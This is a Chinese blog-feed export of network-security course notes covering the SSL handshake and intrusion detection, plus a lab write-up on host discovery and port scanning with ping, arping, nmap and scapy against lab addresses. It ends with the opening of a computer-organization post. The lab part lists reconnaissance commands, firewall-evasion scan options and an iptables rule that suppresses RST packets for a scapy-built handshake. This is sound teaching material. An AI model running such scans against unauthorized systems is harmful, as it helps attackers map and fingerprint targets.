<h3 id="SSL协议"><a href="#SSL协议" class="headerlink" title="SSL协议"></a>SSL协议</h3><blockquote>
<p>协议介绍</p>
</blockquote>
<p>SSL(Secure Sockets Layer 安全套接层)是Netscape公司提出的一种建构在<strong>TCP之上、应用层之下</strong>的Internet通信的安全标准。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677735193336.png"></p>
<blockquote>
<p><strong>4步握手（很重要，每一步传递了什么东西）</strong></p>
</blockquote>
<p>客户机与服务器要建立一个会话，就必须采用<strong>握手协议</strong></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677735518044.png"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677735307524.png"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677735319754.png"></p>
<p>建立安全能力。客户机向服务器发送client_hello消息，服务器向客户机回应server_hello消息。client_hello消息和server_hello消息建立如下的安全属性：协议版本、会话ID、密文族（CipherSuite）、压缩方法、同时生成并交换用于防止重放攻击的随机数。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677735331038.png"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677735347421.png"><br>客户收到server_done消息后，它根据需要检查服务器提供的证书，并判断server_hello的参数是否可以接受。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677735358657.png"></p>
<p>客户发送change_cipher_spec消息，并将挂起状态的CipherSpec复制到当前的CipherSpec。这个消息使用的是改变密码格式协议。然后，客户在新的算法、对称密钥和MAC秘密之下立即发送finished消息。finished消息验证密钥交换和鉴别过程是成功的</p>
<h2 id="入侵检测系统"><a href="#入侵检测系统" class="headerlink" title="入侵检测系统"></a>入侵检测系统</h2><blockquote>
<p><strong>复习建议：重概念，以测试题为主</strong>。</p>
</blockquote>
<blockquote>
<p>入侵检测是防火墙的合理补充,被认为是防火墙之后的第二道安全闸门。</p>
</blockquote>
<p>从计算机网络系统中的若干关键点收集信息，并分析这些信息，从中发觉系统中是否有违反安全策略的行为和被攻击的迹象。</p>
<blockquote>
<p>基于网络与基于主机：</p>
</blockquote>
<ul>
<li><strong>基于主机的入侵检测系统HIDS</strong><br>主要用于保护运行<strong>关键应用的服务器</strong>。它通过监视与分析主机的<strong>审计记录和日志文件</strong>来检测入侵。</li>
<li><strong>基于网络的入侵检测系统NIDS</strong><br>主要用于实时<strong>监控网络关键路径</strong>的信息，它监听网络上的所有<strong>数据包和流量</strong>，分析可疑现象。</li>
</ul>
<p>混合型入侵检测系统集基于主机的IDS和基于网络的IDS的优点于一身，即可以发现网络中的攻击信息，也可以从系统日志中发现异常情况，从而大大提高了入侵检测系统的功能。 </p>
<blockquote>
<p>异常与误用</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677735945933.png"></p>
<blockquote>
<p>主动和被动</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677735974160.png"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1677735788767.png"></p>
]]></content>
      <categories>
        <category>【-专业知识-】渗透测试</category>
        <category>课程记录</category>
      </categories>
      <tags>
        <tag>系统安全</tag>
        <tag>复习</tag>
      </tags>
  </entry>
  <entry>
    <title>信息搜集与漏洞扫描</title>
    <url>/2023/04/06/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E4%B8%8E%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/</url>
    <content><![CDATA[<blockquote>
<p><strong>写在最前面</strong>：本次实践的主要内容包括 主机存活探测、端口扫描、scapy编程、漏洞扫描等，每种内容涉及一种或几种技术。<br><strong>记录只是形式，学会才是目的</strong>！</p>
</blockquote>
<p>下面是大纲：</p>
<ul>
<li><a href="#%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B">主机探测</a><ul>
<li><a href="#ping%E4%B8%8Ettl">ping与TTL</a><ul>
<li><a href="#%E5%AE%9E%E8%B7%B5%E8%BF%87%E7%A8%8B">实践过程</a></li>
<li><a href="#%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85">知识补充</a></li>
</ul>
</li>
<li><a href="#arping%E4%BD%BF%E7%94%A8">arping使用</a><ul>
<li><a href="#%E5%AE%9E%E8%B7%B5%E8%BF%87%E7%A8%8B">实践过程</a></li>
<li><a href="#arping%E6%8C%87%E4%BB%A4%E6%89%A9%E5%B1%95">arping指令扩展</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F">端口扫描</a><ul>
<li><a href="#%E5%AE%9E%E8%B7%B5%E8%BF%87%E7%A8%8B">实践过程</a></li>
<li><a href="#nmap%E6%8C%87%E4%BB%A4%E6%89%A9%E5%B1%95">nmap指令扩展</a></li>
</ul>
</li>
<li><a href="#scapy%E7%BC%96%E7%A8%8B">scapy编程</a><ul>
<li><a href="#%E5%AE%9E%E8%B7%B5%E8%BF%87%E7%A8%8B">实践过程</a></li>
<li><a href="#scapy%E6%89%A9%E5%B1%95">scapy扩展</a></li>
</ul>
</li>
</ul>
<h1 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h1><h2 id="ping与TTL"><a href="#ping与TTL" class="headerlink" title="ping与TTL"></a>ping与TTL</h2><h3 id="实践过程"><a href="#实践过程" class="headerlink" title="实践过程"></a>实践过程</h3><blockquote>
<p><strong>实践要求</strong>：主机A开启命令行，对B进行ping探测，根据B的回复，可以确定主机A和B的连通情况，还可以根据回复数据包的TTL值对操作系统进行猜测。</p>
</blockquote>
<p>下面是<strong>具体的实施过程</strong>：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1680778312520.png"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1680778328290.png"></p>
<p>如上图所示，在未开启防火墙的情况下主机A对主机B进行ping扫描，得到返回信息。</p>
<p>回复数据包的TTL值：   <code>64</code>     ，B运行的操作系统可能为：   <code>LINUX</code>    。</p>
<h3 id="知识补充"><a href="#知识补充" class="headerlink" title="知识补充"></a>知识补充</h3><ol>
<li><strong>Kali Linux 防火墙指令</strong></li>
</ol>
<table>
<thead>
<tr>
<th>指令</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>Apt-get install ufw</td>
<td>安装防火墙</td>
</tr>
<tr>
<td>Systemctl status ufw</td>
<td>查看防火墙状态</td>
</tr>
<tr>
<td>Ufw disable</td>
<td>关闭防火墙</td>
</tr>
<tr>
<td>Ufw enable</td>
<td>开启防火墙</td>
</tr>
<tr>
<td>Ufw status</td>
<td>查看防火墙开启情况</td>
</tr>
<tr>
<td>Ufw version</td>
<td>查看防火墙版本</td>
</tr>
<tr>
<td>Ufw default deny</td>
<td>拒绝所有服务</td>
</tr>
<tr>
<td>Ufw default allow</td>
<td>允许所有服务</td>
</tr>
</tbody></table>
<ol start="2">
<li><strong>TTL与系统类型判断</strong></li>
</ol>
<p><code>TTL（Time To Live，生存时间）</code>是IP协议包中的一个值，当我们使用Ping命令进行网络连通测试或者是测试网速的时候，本地计算机会向目的主机发送数据包，但是有的数据包会因为一些特殊的原因不能正常传送到目的主机，如果没有设置TTL值的话，数据包会一直在网络上面传送，浪费网络资源。数据包在传送的时候至少会经过一个以上的路由器，<strong>当数据包经过一个路由器的时候，TTL就会自动减1，如果减到0了还是没有传送到目的主机，那么这个数据包就会自动丢失</strong>，这时路由器会发送一个ICMP报文给最初的发送者。<br>不同的操作系统的默认TTL值是不同的， 所以我们<strong>可以通过TTL值来判断主机的操作系统</strong>，但是当用户修改了TTL值的时候，就会误导我们的判断，所以这种判断方式也不一定准确。</p>
<p><strong>注</strong>：通过TTL判断操作系统类型是十分不准确的，需要使用更加可靠和精准的方法，比如使用指纹识别技术或者其他的技术手段。这些方法可以通过分析网络协议、使用的服务、传输的数据包结构等来确定操作系统类型。</p>
<ol start="3">
<li><strong>设置防火墙以避免Ping扫描</strong></li>
</ol>
<p>可以使用Kali Linux自带的防火墙工具ufw来防御ping扫描。ufw是一种简单的防火墙工具，它允许在Linux上轻松配置防火墙规则。ufw默认情况下已经安装在Kali Linux中，您可以使用以下命令启用它：<code>sudo ufw enable</code>。然后，您可以使用以下命令来阻止ping扫描：<code>sudo ufw deny icmp</code>。这将禁止所有ICMP流量，包括ping扫描。</p>
<h2 id="arping使用"><a href="#arping使用" class="headerlink" title="arping使用"></a>arping使用</h2><h3 id="实践过程-1"><a href="#实践过程-1" class="headerlink" title="实践过程"></a>实践过程</h3><blockquote>
<p> arping是一个在LAN中<strong>使用ARP地址解析协议发现目标主机的工具</strong>。arping工具测试特定IP地址在网络中是否在线。该命令只能在本地局域网内运行，无法跨越路由器和网关，常用的选项为arping -c。Wireshark抓包分析该工具的工作原理。</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1680779156049.png"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1680779168906.png"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1680779188634.png"></p>
<p>如图所示，通过wirshark抓包，可以得到arping指令下的网络数据包情况。通过分析具体的协议字段可以看出：这个工具<strong>通过广播的方式发送ARP请求报文</strong>。当探测主机（192.168.72.129）接收到ARP请求包后会向报文中的目的地址<strong>发送ARP响应报文</strong>。<br><strong>综上所述</strong>：arping命令是一个用于测试和管理局域网的工具，它可以通过向本网段下所有主机发起arp请求，然后看收到响应的消息的mac地址是否是我们需要的mac地址，如果是，那么这个ip就是该网卡绑定的ip了。同时如何收到响应包也就说明该主机存活。</p>
<blockquote>
<p>分析并回答：<strong>在同一子网中判断目标主机存活性，ping和arping谁更具优势？</strong><br>当需要在同一子网中确定主机是否存活时，使用arping命令有以下优势：</p>
</blockquote>
<ul>
<li><strong>更快的响应时间</strong>：在同一子网中，目标主机的MAC地址可以从ARP缓存中获取，而无需使用IP地址进行寻址。因此，arping命令可以直接向目标主机发送ARP请求，并根据目标主机是否响应来判断其是否存活。相比之下，ping命令需要发送ICMP数据包并等待回复，这可能会花费更多的时间，并且目标主机可能会过滤掉ICMP数据包。</li>
<li><strong>不会被目标主机屏蔽</strong>：一些主机可能会过滤掉ICMP数据包，从而使ping命令无法检测到其存活状态。相比之下，arping命令发送的是ARP请求，不会被目标主机屏蔽。</li>
<li>更精确的诊断：在一些网络环境下，目标主机的ICMP回复可能会被路由器或防火墙拦截，从而导致ping命令误判目标主机的状态。而arping命令只与目标主机进行通信，因此能够提供更精确的诊断结果。</li>
<li><strong>可以检测到MAC地址变更</strong>：如果目标主机的MAC地址发生变化，arping命令可以检测到这一变化，并更新本地ARP缓存中的MAC地址。而ping命令无法检测到MAC地址的变更，因为它只依赖IP地址进行通信。</li>
</ul>
<p>综上所述，当需要在同一子网中快速确定主机是否存活时，arping命令是一种更可靠、更精确、更快速的工具。</p>
<h3 id="arping指令扩展"><a href="#arping指令扩展" class="headerlink" title="arping指令扩展"></a>arping指令扩展</h3><p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1680779337097.png"></p>
<p><strong>参数释义：</strong></p>
<table>
<thead>
<tr>
<th>-A：</th>
</tr>
</thead>
<tbody><tr>
<td>与-U参数类似，但是使用的是ARP REPLY包而非ARP REQUEST包。</td>
</tr>
<tr>
<td>-b：</td>
</tr>
<tr>
<td>发送以太网广播帧，arping在开始时使用广播地址，在收到回复后使用unicast单播地址。</td>
</tr>
<tr>
<td>-c：</td>
</tr>
<tr>
<td>发送指定的count个ARP REQUEST包后停止。如果指定了-w参数，则会等待相同数量的ARP REPLY包，直到超时为止。</td>
</tr>
<tr>
<td>-D：</td>
</tr>
<tr>
<td>重复地址探测模式，即，Duplicate address detection mode (DAD)，用来检测有没有IP地址冲突，如果没有IP冲突则返回0。</td>
</tr>
<tr>
<td>-f：</td>
</tr>
<tr>
<td>收到第一个响应包后退出。</td>
</tr>
<tr>
<td>-h：</td>
</tr>
<tr>
<td>显示帮助页。</td>
</tr>
<tr>
<td>-I：</td>
</tr>
<tr>
<td>用来发送ARP REQUEST包的网络设备的名称。</td>
</tr>
<tr>
<td>-q：</td>
</tr>
<tr>
<td>quite模式，不显示输出。</td>
</tr>
<tr>
<td>-U：</td>
</tr>
<tr>
<td>无理由的（强制的）ARP模式去更新别的主机上的ARP CACHE列表中的本机的信息，不需要响应。</td>
</tr>
<tr>
<td>-V：</td>
</tr>
<tr>
<td>显示arping的版本号。</td>
</tr>
<tr>
<td>-w：</td>
</tr>
<tr>
<td>指定一个超时时间，单位为秒，arping在到达指定时间后退出，无论期间发送或接收了多少包。在这种情况下，arping在发送完指定的count（-c）个包后并不会停止，而是等待到超时或发送的count个包都进行了回应后才会退出。</td>
</tr>
<tr>
<td>-s：设置发送ARP包的IP资源地址，如果为空，则按如下方式处理：</td>
</tr>
<tr>
<td>1、DAD模式（-D）设置为0.0.0.0；</td>
</tr>
<tr>
<td>2、Unsolicited模式（-U）设置为目标地址；</td>
</tr>
<tr>
<td>3、其它方式，从路由表计算。</td>
</tr>
</tbody></table>
<p><strong>操作实例：</strong></p>
<ul>
<li>用于检验目标主机是否存活：<code>arping 192.168.72.129 -c 1</code></li>
<li>查看某个IP是否被不同的MAC占用: <code>arping -d 192.168.72.159</code></li>
</ul>
<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>这里进行端口扫描使用的工具是nmap，这是一个功能强大的扫描工具。</p>
<h2 id="实践过程-2"><a href="#实践过程-2" class="headerlink" title="实践过程"></a>实践过程</h2><blockquote>
<p><strong>对活动主机进行端口扫描</strong></p>
</blockquote>
<p>主机A使用Nmap工具对主机B进行TCP端口同步扫描（范围1-150）：<br>Nmap命令：<code>nmap -sS -p 1-150 192.168.72.129</code></p>
<ul>
<li>补充1：-sS 表示<strong>TCP SYN扫描</strong></li>
<li>补充2：<strong>TCP端口同步扫描就是TCP SYN扫描</strong>。它是一种半开放扫描，通过向目标服务器的端口发送一个请求连接的SYN包，如果目标端口开放，则服务器会向扫描器返回一个SYN&#x2F;ACK包，否则会返回一个RST包。</li>
</ul>
<blockquote>
<p><strong>对主机B进行UDP端口扫描（</strong>范围是110-140）：</p>
</blockquote>
<p>Nmap命令： <code>nmap -sU -p 110-140 192.168.72.129</code></p>
<ul>
<li><strong>补充</strong>：-sU表示扫描UDP端口，-p:指定端口范围</li>
</ul>
<blockquote>
<p><strong>对活动主机操作系统进行探测</strong></p>
</blockquote>
<p>主机A对主机B进行TCP&#x2F;IP指纹特征扫描:<br>Nmap命令：<code>nmap -O 192.168.72.129</code></p>
<blockquote>
<p><strong>对活动主机运行服务进行探测</strong></p>
</blockquote>
<p>Nmap命令：<code>nmap -sV 192.168.72.129</code></p>
<blockquote>
<p>主机A使用Nmap命令对主机B进行<strong>IP协议探测</strong>：</p>
</blockquote>
<p>Nmap命令：<code>nmap -sO 192.168.72.129</code></p>
<h2 id="nmap指令扩展"><a href="#nmap指令扩展" class="headerlink" title="nmap指令扩展"></a>nmap指令扩展</h2><table>
<thead>
<tr>
<th>参数(区分大小写)</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>-sT</td>
<td>TCP connect()扫描，这种方式会在目标主机的日志中记录大批连接请求和错误信息。</td>
</tr>
<tr>
<td>-sS</td>
<td>半开扫描，很少有系统能把它记入系统日志。不过，需要Root权限。</td>
</tr>
<tr>
<td>-sF  -sN</td>
<td>秘密FIN数据包扫描、Xmas Tree、Null扫描模式</td>
</tr>
<tr>
<td>-sP</td>
<td>ping扫描，Nmap在扫描端口时，默认都会使用ping扫描，只有主机存活，Nmap才会继续扫描。</td>
</tr>
<tr>
<td>-sU</td>
<td>UDP扫描，但UDP扫描是不可靠的</td>
</tr>
<tr>
<td>-sA</td>
<td>这项高级的扫描方法通常用来穿过防火墙的规则集</td>
</tr>
<tr>
<td>-sV</td>
<td>探测端口服务版本</td>
</tr>
<tr>
<td>-Pn</td>
<td>扫描之前不需要用ping命令，有些防火墙禁止ping命令。可以使用此选项进行扫描</td>
</tr>
<tr>
<td>-v</td>
<td>显示扫描过程，推荐使用</td>
</tr>
<tr>
<td>-h</td>
<td>帮助选项，是最清楚的帮助文档</td>
</tr>
<tr>
<td>-p</td>
<td>指定端口，如“1-65535、1433、135、22、80”等</td>
</tr>
<tr>
<td>-O</td>
<td>启用远程操作系统检测，存在误报</td>
</tr>
<tr>
<td>-A</td>
<td>全面系统检测、启用脚本检测、扫描等</td>
</tr>
<tr>
<td>-oN&#x2F;-oX&#x2F;-oG</td>
<td>将报告写入文件，分别是正常、XML、grepable 三种格式</td>
</tr>
<tr>
<td>-T4</td>
<td>针对TCP端口禁止动态扫描延迟超过10ms</td>
</tr>
<tr>
<td>-iL</td>
<td>读取主机列表，例如，“-iL C:\ip.txt”</td>
</tr>
</tbody></table>
<p>Nmap使用时的<strong>注意事项</strong>：</p>
<ul>
<li>nmap扫描会产生大量的网络流量，可能会影响网络性能。</li>
<li>nmap扫描可能会被防火墙或入侵检测系统检测到，因此需要谨慎使用。</li>
<li>nmap扫描可能会被误认为是攻击行为，因此需要获得授权后再使用。</li>
<li>nmap扫描可能会泄露网络拓扑结构和主机信息，因此需要谨慎使用</li>
</ul>
<h1 id="scapy编程"><a href="#scapy编程" class="headerlink" title="scapy编程"></a>scapy编程</h1><p>Scapy是Python中<strong>构造网络数据包的模块</strong>，它可以完成绝大多数工具所能完成的功能，例如：扫描，网络发现，跟踪路由，探测，攻击等。</p>
<h2 id="实践过程-3"><a href="#实践过程-3" class="headerlink" title="实践过程"></a>实践过程</h2><p><code>send、sendp、sr、sr1</code> 发送数据包函数使用。可以通过python导入此库也可以在命令行直接输入指令。</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1680779974688.png"></p>
<blockquote>
<p><strong>send函数</strong>工作在第三层，只发送数据包:</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1680780010120.png"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1680780018263.png"></p>
<blockquote>
<p><strong>sendp函数</strong>工作在第二层，只发送数据包:</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1680780048958.png"></p>
<blockquote>
<p><strong>sr()函数</strong>用来发送数据包和接收响应:</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1680780075374.png"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1680780084105.png"></p>
<blockquote>
<p>构造数据包来实现<strong>TCP SYN端口扫描</strong>：</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1680780133940.png"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1680780144735.png"></p>
<blockquote>
<p><strong>模拟三次握手实现TCP连接</strong>:</p>
</blockquote>
<p><strong>注</strong>：<a href="https://www.osgeo.cn/scapy/usage.html#syn-scans">官方文档有这个实例</a></p>
<p><strong>代码如下</strong>：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1680780176675.png"></p>
<p><strong>运行效果</strong>：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1680780196894.png"></p>
<p><strong>注意事项</strong>：</p>
<ol>
<li>要理清三次握手是seq与ack值的变化，ack的值是seq+1,也是期望收到的下一个包的seq值。seq随机生成初始值，而后在之后的发送中递增1</li>
<li>进行三次握手要保证目标机器开启了Apache服务，win下通过phpstudy开启，kali可以通过指令开启：<code>service apache2 start</code></li>
<li>如果用于测试的主机为LINUX，需要关闭RST：<code>iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP</code></li>
</ol>
<h2 id="scapy扩展"><a href="#scapy扩展" class="headerlink" title="scapy扩展"></a>scapy扩展</h2><p>一定要看<strong>官方文档</strong>：<a href="https://www.osgeo.cn/scapy/introduction.html">https://www.osgeo.cn/scapy/introduction.html</a></p>
<p>这里主要就<strong>上述使用到的知识</strong>进行扩展：</p>
<blockquote>
<p> <strong>数据包构造</strong>：</p>
</blockquote>
<p>	Scapy数据包的创建与网络中的分层方法一致。<br>	数据包的基本构建块是一层，而整个数据包则是通过将各个层堆叠在一起而构建的。<br>	scapy通过在TCP &#x2F; IP的不同层上为每个协议定义数据包头，然后按顺序堆叠这些层，来构造数据包。</p>
<p>可以通过<strong>show</strong>显示详细的包头：</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1680780697670.png"></p>
<blockquote>
<p><strong>send函数</strong>：</p>
</blockquote>
<table>
<thead>
<tr>
<th>scapy.sendrecv.send(x, iface&#x3D;None,**kargs)</th>
</tr>
</thead>
<tbody><tr>
<td>功能：在第三层发送数据包</td>
</tr>
<tr>
<td>参数：</td>
</tr>
<tr>
<td>x – 数据包</td>
</tr>
<tr>
<td>inter – 两个数据包之间的时间（以秒为单位）（默认值为0）</td>
</tr>
<tr>
<td>loop – send packet indefinitely (default 0)</td>
</tr>
<tr>
<td>count – 要发送的数据包数（默认无&#x3D;1）</td>
</tr>
<tr>
<td>verbose – 详细模式（默认无&#x3D;conf.详细)</td>
</tr>
<tr>
<td>realtime – 在发送下一个包之前，请检查是否已发送了一个包</td>
</tr>
<tr>
<td>return_packets – 返回发送的数据包</td>
</tr>
<tr>
<td>socket – 要使用的套接字（默认为conf.L3socket（kargs））</td>
</tr>
<tr>
<td>iface – 发送数据包的接口</td>
</tr>
<tr>
<td>monitor – （不在linux上）以监视模式发送</td>
</tr>
<tr>
<td>返回值：无</td>
</tr>
<tr>
<td>源代码链接：<a href="https://www.osgeo.cn/scapy/api/scapy.sendrecv.html#scapy.sendrecv.send">https://www.osgeo.cn/scapy/api/scapy.sendrecv.html#scapy.sendrecv.send</a></td>
</tr>
</tbody></table>
<blockquote>
<p><strong>sendp函数</strong>：</p>
</blockquote>
<table>
<thead>
<tr>
<th>scapy.sendrecv.sendp(x, iface&#x3D;None, iface_hint&#x3D;None, socket&#x3D;None, **kargs)</th>
</tr>
</thead>
<tbody><tr>
<td>功能：在第二层发送数据包</td>
</tr>
<tr>
<td>参数：</td>
</tr>
<tr>
<td>x – 数据包</td>
</tr>
<tr>
<td>inter – 两个数据包之间的时间（以秒为单位）（默认值为0）</td>
</tr>
<tr>
<td>loop – send packet indefinitely (default 0)</td>
</tr>
<tr>
<td>count – 要发送的数据包数（默认无&#x3D;1）</td>
</tr>
<tr>
<td>verbose – 详细模式（默认无&#x3D;conf.详细)</td>
</tr>
<tr>
<td>realtime – 在发送下一个包之前，请检查是否已发送了一个包</td>
</tr>
<tr>
<td>return_packets – 返回发送的数据包</td>
</tr>
<tr>
<td>socket – 要使用的套接字（默认为conf.L3socket（kargs））</td>
</tr>
<tr>
<td>iface – 发送数据包的接口</td>
</tr>
<tr>
<td>monitor – （不在linux上）以监视模式发送</td>
</tr>
<tr>
<td>返回值：无</td>
</tr>
<tr>
<td>源代码：<a href="https://github.com/secdev/scapy/blob/master/scapy/sendrecv.py#L443-L474">https://github.com/secdev/scapy/blob/master/scapy/sendrecv.py#L443-L474</a></td>
</tr>
</tbody></table>
<blockquote>
<p><strong>sr函数</strong></p>
</blockquote>
<table>
<thead>
<tr>
<th>scapy.sendrecv.sr(x, promisc&#x3D;None, filter&#x3D;None, iface&#x3D;None, nofilter&#x3D;0, *args, **kargs)</th>
</tr>
</thead>
<tbody><tr>
<td>功能：在第三层发送和接收数据包</td>
</tr>
<tr>
<td>参数：</td>
</tr>
<tr>
<td>pks – 发送&#x2F;接收数据包的SuperSocket实例</td>
</tr>
<tr>
<td>pkt – 要发送的数据包</td>
</tr>
<tr>
<td>rcv_pks – 如果设置，则将使用而不是pks来接收数据包。数据包仍将通过pks发送</td>
</tr>
<tr>
<td>nofilter – 输入1以避免使用BPF过滤器</td>
</tr>
<tr>
<td>retry – 如果为正数，则重发未应答数据包的次数（如果为负数），当没有更多的数据包被应答时重试多少次</td>
</tr>
<tr>
<td>timeout – 最后一个数据包发送后要等待多长时间</td>
</tr>
<tr>
<td>verbose – 设置详细级别</td>
</tr>
<tr>
<td>multi – 是否接受同一刺激的多个答案</td>
</tr>
<tr>
<td>prebuild – 在开始发送数据包之前，先预构建这些包。当发电机作为数据包传递时自动启用</td>
</tr>
<tr>
<td>sr（）返回两个列表，第一个列表包含响应的，第二个列表包含未响应的</td>
</tr>
<tr>
<td>源代码：<a href="https://github.com/secdev/scapy/blob/master/scapy/sendrecv.py#L606-L623">https://github.com/secdev/scapy/blob/master/scapy/sendrecv.py#L606-L623</a></td>
</tr>
</tbody></table>
<blockquote>
<p><strong>sr1函数</strong></p>
</blockquote>
<table>
<thead>
<tr>
<th>scapy.sendrecv.sr1(x, promisc&#x3D;None, filter&#x3D;None, iface&#x3D;None, nofilter&#x3D;0, *args, **kargs)</th>
</tr>
</thead>
<tbody><tr>
<td>功能：在第三层发送和接收数据包，只返回一个答案</td>
</tr>
<tr>
<td>参数：</td>
</tr>
<tr>
<td>pks – 发送&#x2F;接收数据包的SuperSocket实例</td>
</tr>
<tr>
<td>pkt – 要发送的数据包</td>
</tr>
<tr>
<td>rcv_pks – 如果设置，则将使用而不是pks来接收数据包。数据包仍将通过pks发送</td>
</tr>
<tr>
<td>nofilter – 输入1以避免使用BPF过滤器</td>
</tr>
<tr>
<td>retry – 如果为正数，则重发未应答数据包的次数（如果为负数），当没有更多的数据包被应答时重试多少次</td>
</tr>
<tr>
<td>timeout – 最后一个数据包发送后要等待多长时间</td>
</tr>
<tr>
<td>verbose – 设置详细级别</td>
</tr>
<tr>
<td>multi – 是否接受同一刺激的多个答案</td>
</tr>
<tr>
<td>prebuild – 在开始发送数据包之前，先预构建这些包。当发电机作为数据包传递时自动启用</td>
</tr>
<tr>
<td>sr（）返回一个列表，列表包含响应的</td>
</tr>
<tr>
<td>源代码：<a href="https://github.com/secdev/scapy/blob/master/scapy/sendrecv.py#L606-L623">https://github.com/secdev/scapy/blob/master/scapy/sendrecv.py#L606-L623</a></td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>【-专业知识-】渗透测试</category>
        <category>课程记录</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>计算机基础——计算机组成原理（b栈视频版）</title>
    <url>/2023/01/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%EF%BC%88B%E7%AB%99%EF%BC%89.md/</url>
    <content><![CDATA[<blockquote>
<p>写在最前面：本篇文章会分章节简要介绍一下计算机组成原理的相关知识，从计算机硬件依次进行介绍，并最终在xxxx中动手制作一台计算机。（以描线的方式）</p>
</blockquote>
<blockquote>
<p>前情提要：需要先了解二进制与编码相关知识，对于逻辑运算和逻辑门等要知晓，对于算术逻辑单元ALU的组成和功能有所了解。</p>
</blockquote>
<h1 id="寄存器-内存"><a href="#寄存器-内存" class="headerlink" title="寄存器 &amp; 内存"></a>寄存器 &amp; 内存</h1><blockquote>
<p>前面已经：学习了ALU，下面就要学习使用ALU制作CPU。但是在此之前，计算机还需要一些“记忆”，也就是内存。</p>
</blockquote>
<h2 id="锁存器"><a href="#锁存器" class="headerlink" title="锁存器"></a>锁存器</h2><blockquote>
<p>一个基础的电路抽象，可以存储单bit数据，相当于<code>造房子的砖头</code>。下面会从最基础的单门电路进行介绍，而后进行组合、简化、封装得到需要的原件。</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1657875521928.png"></p>
<p>上述OR电路可以<strong>永久存储1</strong>，无论输入怎么变都不会改变输出。</p>
